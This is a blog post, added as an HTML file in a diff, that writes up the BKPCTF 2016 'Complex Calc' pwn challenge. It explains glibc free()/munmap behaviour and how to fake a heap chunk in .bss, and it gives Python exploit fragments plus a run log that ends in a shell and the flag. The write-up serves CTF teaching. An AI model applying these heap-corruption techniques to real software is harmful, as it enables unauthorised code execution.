@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>BKPCTF 2016 - Complex Calc</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2016/03/08/bkpctf-2016-complex-calc.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="The challenge is the sequel to simple_calc. If you haven't read our write-up, now is the time 😊 Info ~ $ file...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="pwn">
+    <meta name="tags" content="gef">
+    <meta name="tags" content="ida">
+    <meta name="tags" content="bkpctf-2016">
+    <meta name="tags" content="x86">
+    <meta name="tags" content="heap-overflow">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="BKPCTF 2016 - Complex Calc"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="The challenge is the sequel to simple_calc. If you haven't read our write-up, now is the time 😊 Info ~ $ file..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2016/03/08/bkpctf-2016-complex-calc.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2016-03-08 00:00:00-08:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2016-03-08 00:00:00-08:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="ctf"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="pwn"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="gef"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="ida"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="bkpctf-2016"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="x86"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="heap-overflow"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="BKPCTF 2016 - Complex Calc">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2016/03/08/bkpctf-2016-complex-calc.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+      <meta name="twitter:description" content="The challenge is the sequel to simple_calc. If you haven't read our write-up, now is the time 😊 Info ~ $ file...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "BKPCTF 2016 - Complex Calc",
+  "headline": "BKPCTF 2016 - Complex Calc",
+  "datePublished": "2016-03-08 00:00:00-08:00",
+  "dateModified": "2016-03-08 00:00:00-08:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/blog-cover.png",
+  "url": "https://blahcat.github.io/posts/2016/03/08/bkpctf-2016-complex-calc.html",
+  "description": "The challenge is the sequel to simple_calc. If you haven't read our write-up, now is the time 😊 Info ~ $ file..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">BKPCTF 2016 - Complex Calc</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">08 Mar 2016</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/blog-cover.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <p>The challenge is the sequel to <code>simple_calc</code>. If you haven't read our <a href="/posts/2016/03/07/bkpctf-2016-simple-calc-writeup.html">write-up</a>, now is the time 😊</p>
+<h3>Info</h3>
+<div class="highlight"><pre><span></span><code>~<span class="w"> </span>$<span class="w"> </span>file<span class="w"> </span>d60001db1a24eca410c5d102410c3311d34d832c
+d60001db1a24eca410c5d102410c3311d34d832c:<span class="w"> </span>ELF<span class="w"> </span><span class="m">64</span>-bit<span class="w"> </span>LSB<span class="w"> </span>executable,<span class="w"> </span>x86-64,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>GNU/Linux<span class="o">)</span>,<span class="w"> </span>statically<span class="w"> </span>linked,<span class="w"> </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">2</span>.6.24,<span class="w"> </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>3ca876069b2b8dc3f412c6205592a1d7523ba9ea,<span class="w"> </span>not<span class="w"> </span>stripped
+~<span class="w"> </span>$<span class="w"> </span>checksec.sh<span class="w"> </span>--file<span class="w"> </span>d60001db1a24eca410c5d102410c3311d34d832c
+RELRO<span class="w">           </span>STACK<span class="w"> </span>CANARY<span class="w">      </span>NX<span class="w">            </span>PIE<span class="w">             </span>RPATH<span class="w">      </span>RUNPATH<span class="w">      </span>FILE
+Partial<span class="w"> </span>RELRO<span class="w">   </span>No<span class="w"> </span>canary<span class="w"> </span>found<span class="w">   </span>NX<span class="w"> </span>enabled<span class="w">    </span>No<span class="w"> </span>PIE<span class="w">          </span>No<span class="w"> </span>RPATH<span class="w">   </span>No<span class="w"> </span>RUNPATH<span class="w">   </span>d60001db1a24eca410c5d102410c3311d34d832c
+</code></pre></div>
+
+<h3>Vulnerability</h3>
+<p>At the very first look, <code>simple_calc</code> and <code>complex_calc</code> look totally
+similar. Both are statically compiled, same protections, the vulnerability is
+located at the same spot (i.e. stack overflow with a malloc-ed buffer we fully
+control). Let's do some bindiffing!</p>
+<p>One of my new toys for quite a few months now is IDA Python plugin
+<a href="https://github.com/joxeankoret/diaphora">diaphora</a> by Joxean Koret (aka
+<a class="fa fa-twitter" href="https://twitter.com/matalaz" target="_blank"> matalaz</a>). By diffing then, the issue is immediately visible:</p>
+<p><img alt="image_alt" src="https://i.imgur.com/0tkaNNT.png"></p>
+<p>The <code>free()</code> function was modified so we cannot benefit from the graceful exit
+of the function by simply passing a NULL pointer. Now, <code>free()</code> will always
+proceed with the address given as first parameter (therefore stored in $rdi).</p>
+<p>So let's see how <code>free()</code>
+works. <a href="https://kitctf.de/writeups/0ctf2015/freenote">Some blogs</a> already explain very well how
+<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Glibc heap is structured</a>
+and how
+<a href="http://phrack.org/issues/57/9.html">heap</a>
+<a href="http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup">corruptions</a>
+work. So I will assume you know as well.</p>
+<p>To stand on common ground, here is what a heap chunk looks like:</p>
+<p><img alt="image_alt" src="https://i.imgur.com/EVnKlBg.png"></p>
+<p>When <code>free()</code> is called, some checks are made to know how the chunk must be
+deallocated:</p>
+<ol>
+<li>If its size is below <code>MMAP_THRESHOLD</code> (default 128KB), then the chunk is
+      deallocated and inserted into the free chunk doubly linked list. The
+      pointers of the list are updated using the <code>unlink</code> macro.</li>
+<li>If the size is higher than <code>MMAP_THRESHOLD</code>, then the chunk was not
+      allocated via the <code>brk</code>/<code>sbrk</code> syscall, but mapped in memory via the
+      syscall <code>mmap</code>. If this heap chunk is <code>mmap</code>-ed, then its size will be a
+      multiple of 2 (i.e. size &amp; 2 = 2).</li>
+</ol>
+<p>This actually shows quite well in the flow graph:</p>
+<p><img alt="image_alt" src="https://i.imgur.com/omGULMz.png"></p>
+<p>Since we control what is written in the heap (same method than <code>simple_calc</code>),
+we can control whether we want to deallocate using <code>unlink</code> or <code>munmap</code> (simply
+by or-ing the QWORD interpreter as the chunk size with 2). If we go for using
+the regular deallocator, we need to fake our heap chunk in such a way that it will
+pass all the checks performed later on. Any failure on the address will
+<code>abort()</code> the program, making it enable to reach the <code>ret</code> instruction, and
+therefore triggering our ROP chain.</p>
+<p>On the other hand, the <code>munmap()</code> function is actually fairly straight-forward:</p>
+<div class="highlight"><pre><span></span><code>.text:0000000000435670<span class="w"> </span>munmap<span class="w">          </span>proc<span class="w"> </span>near<span class="w">               </span><span class="p">;</span><span class="w"> </span>CODE<span class="w"> </span>XREF:<span class="w"> </span>__assert_fail_base+110
+.text:0000000000435670<span class="w">                                         </span><span class="p">;</span><span class="w"> </span>_nl_load_domain+4C9<span class="w"> </span>...
+.text:0000000000435670<span class="w">                 </span>mov<span class="w">     </span>eax,<span class="w"> </span>0Bh<span class="w">        </span><span class="p">;</span><span class="w"> </span>Alternative<span class="w"> </span>name<span class="w"> </span>is<span class="w"> </span><span class="s1">&#39;__munmap&#39;</span>
+.text:0000000000435675<span class="w">                 </span>syscall
+.text:0000000000435677<span class="w">                 </span>cmp<span class="w">     </span>rax,<span class="w"> </span>-0FFFh
+.text:000000000043567D<span class="w">                 </span>jnb<span class="w">     </span>__syscall_error
+.text:0000000000435683<span class="w">                 </span>retn
+.text:0000000000435683<span class="w"> </span>munmap<span class="w">          </span>endp
+</code></pre></div>
+
+<p>If the syscall fails, it will nicely set $rax to a negative value and
+return back to <code>free()</code>, which will return (in error as well but we don't care)
+to our main loop, which can then return nicely too and trigger our
+code. Perfect! Let's go with this!</p>
+<h3>Exploitation</h3>
+<p>So we are going to use the arithmetic operators and result locations in the
+<code>.bss</code> since they are at predictable, bearing in mind that each one of them is
+only a DWORD (whereas we are here on x86-64 architecture). We will want to set
+the following mapping:</p>
+<div class="highlight"><pre><span></span><code>.bss:00000000006C4A88<span class="w"> </span>add_result<span class="w">      </span>dd<span class="w"> </span>?<span class="w">                    </span><span class="p">;</span><span class="w"> </span>&lt;--<span class="w"> </span>previous<span class="w"> </span>chunk<span class="w"> </span>size
+.bss:00000000006C4A8C<span class="w">                 </span>align<span class="w"> </span>10h
+.bss:00000000006C4A90<span class="w"> </span>div_operator_1<span class="w">  </span>dd<span class="w"> </span>?<span class="w">                    </span><span class="p">;</span><span class="w"> </span>&lt;--<span class="w"> </span>chunk<span class="w"> </span>size<span class="w"> </span><span class="o">(</span>need<span class="w"> </span>to<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>flag<span class="w"> </span>IS_<span class="sb">`</span>mmap<span class="sb">`</span>-ed<span class="o">)</span>
+.bss:00000000006C4A94<span class="w"> </span>div_operator_2<span class="w">  </span>dd<span class="w"> </span>?<span class="w">                    </span><span class="p">;</span><span class="w"> </span>&lt;--
+.bss:00000000006C4A98<span class="w"> </span>div_result<span class="w">      </span>dd<span class="w"> </span>?<span class="w">                    </span><span class="p">;</span><span class="w"> </span>&lt;--<span class="w"> </span>free<span class="w"> </span>will<span class="w"> </span>point<span class="w"> </span>@this<span class="w"> </span>chunk
+.bss:00000000006C4A9C<span class="w">                 </span>align<span class="w"> </span>10h
+</code></pre></div>
+
+<p>We will point the $rdi used by the <code>free()</code> call pointing to <code>div_result</code>. But
+now which value should we use then for operator_1 and operator_2 ?</p>
+<p>Let's go back to <code>free()</code> flow graph:</p>
+<p><img alt="image_alt" src="https://i.imgur.com/7ZEy4nD.png"></p>
+<p>As we see, several conditions must be filled:</p>
+<ol>
+<li><code>chunk_size = div_operator_2 | div_operator_1</code> (and <strong>must</strong> be divisible by 2).</li>
+<li><code>prev_size  = dword_padding  | add_result</code></li>
+<li><code>0x0fff &amp; ((@prev_size-prev_size) | (prev_size+size&amp;0xfff...ff8)) == 0</code></li>
+</ol>
+<p>If we passed those checks, $rcx will have the address to <code>munmap()</code>, and $rsi
+the range to deallocate. <code>add_result</code> is at 0x6C4A88 so we must ensure the three
+last nibbles end with 0xa88 to nullify the substration. We decide to store in
+<code>add_result</code> the value 0x0x11111a88 as the addition of 0x11110a88 and 0x1000</p>
+<div class="highlight"><pre><span></span><code>    <span class="c1"># set add_result</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;=&gt; &quot;</span><span class="p">)</span>
+    <span class="n">op1</span> <span class="o">=</span> <span class="mh">0x11110a88</span>
+    <span class="n">op2</span> <span class="o">=</span> <span class="mh">0x00001000</span>
+    <span class="n">do_add</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">op1</span><span class="p">,</span> <span class="n">op2</span><span class="p">)</span>
+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;prev_size=</span><span class="si">%#x</span><span class="s2">+</span><span class="si">%#x</span><span class="s2">=</span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">op2</span><span class="p">,</span> <span class="n">op1</span><span class="p">,</span> <span class="n">op1</span><span class="o">+</span><span class="n">op2</span><span class="p">))</span>
+</code></pre></div>
+
+<p>Now that we have <code>prev_size</code>, we can make up a value for <code>size</code> too. But here is
+the trick, the value of <code>size</code> will end in $rdi when <code>munmap</code> syscall will
+happen. If we point to a valid address, it will be unmapped and our exploit will
+fail. So to be safe, we will use a huge valid and let the kernel throw us away
+:) Here we used 0x7fffdeaa0000.</p>
+<p><code>size = 0x7fffdeaa0000 - 0x11111a88 = 0x9ffffeee578</code></p>
+<p>Splitting the result into 2 DWORD and we have div_operator_1=0xfffeee578 and
+div_operator_2=0x9f.</p>
+<div class="highlight"><pre><span></span><code>    <span class="c1"># set div_1 and div_2</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;=&gt; &quot;</span><span class="p">)</span>
+    <span class="n">op2</span><span class="p">,</span> <span class="n">op1</span>  <span class="o">=</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0xfffeee578</span> <span class="o">|</span> <span class="mi">2</span>
+    <span class="n">do_div</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">op1</span><span class="p">,</span> <span class="n">op2</span><span class="p">)</span>
+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;size=0x</span><span class="si">%.8x%.8x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">op2</span><span class="p">,</span> <span class="n">op1</span><span class="p">))</span>
+</code></pre></div>
+
+<p>The rest of the exploit is exactly similar to the one used for <code>simple_calc</code>!</p>
+<p>Fire up!</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./complex_calc.py<span class="w">                                                                                                                                       </span><span class="o">[</span><span class="m">23</span>:43<span class="o">]</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span>simplecalc.bostonkey.party:5500
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Running<span class="w"> </span><span class="m">47</span><span class="w"> </span>calculations
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Building<span class="w"> </span>fake<span class="w"> </span>chunk<span class="w"> </span>0x6c4a98
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">prev_size</span><span class="o">=</span>0x1000+0x11110a88<span class="o">=</span>0x11111a88
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">size</span><span class="o">=</span>0x0000009ffffeee57a
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>it,<span class="w"> </span>interacting<span class="w"> </span><span class="o">(</span>Ctrl-C<span class="w"> </span>to<span class="w"> </span><span class="k">break</span><span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Get<span class="w"> </span>a<span class="w"> </span>PTY<span class="w"> </span>with<span class="w"> </span><span class="s1">&#39; python -c &quot;import pty;pty.spawn(&#39;</span>/bin/bash<span class="s1">&#39;)&quot;  &#39;</span>
+cat<span class="w"> </span>key
+BKPCTF<span class="o">{</span>th3<span class="w"> </span>l4st<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">2</span><span class="w"> </span>3z<span class="o">}</span>
+</code></pre></div>
+
+<p>And we get <code>BKPCTF{th3 l4st 1 2 3z}</code></p>
+<p>The full exploit is <a href="https://gist.github.com/hugsy/7bcb5db17b75a86ae3bd">here</a>.</p>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=BKPCTF 2016 - Complex Calc&amp;url=https://blahcat.github.io/posts/2016/03/08/bkpctf-2016-complex-calc.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2016/03/08/bkpctf-2016-complex-calc.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2016/03/08/bkpctf-2016-complex-calc.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/pwn">pwn</a><a href="https://blahcat.github.io/tag/gef">gef</a><a href="https://blahcat.github.io/tag/ida">ida</a><a href="https://blahcat.github.io/tag/bkpctf-2016">bkpctf-2016</a><a href="https://blahcat.github.io/tag/x86">x86</a><a href="https://blahcat.github.io/tag/heap-overflow">heap-overflow</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/ctf">ctf</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=BKPCTF 2016 - Complex Calc">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2016/03/14/0ctf-2016-warmup-write-up.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">0ctf 2016 - Warmup write-up</h2>
+                            <p class="post-nav-excerpt">I participated to 0ctf but only had time to play for the reversing challenge trace...</p>
+                        </section>
+                    </a>
+                    <a class="post-nav-prev" href="https://blahcat.github.io/posts/2016/03/07/bkpctf-2016-simple-calc.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-right"></i>
+                                <h2 class="post-nav-title">BKPCTF 2016 - Simple Calc</h2>
+                            <p class="post-nav-excerpt">Info ~/cur/simple_calc $ file b28b103ea5f1171553554f0127696a18c6d2dcf7...</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
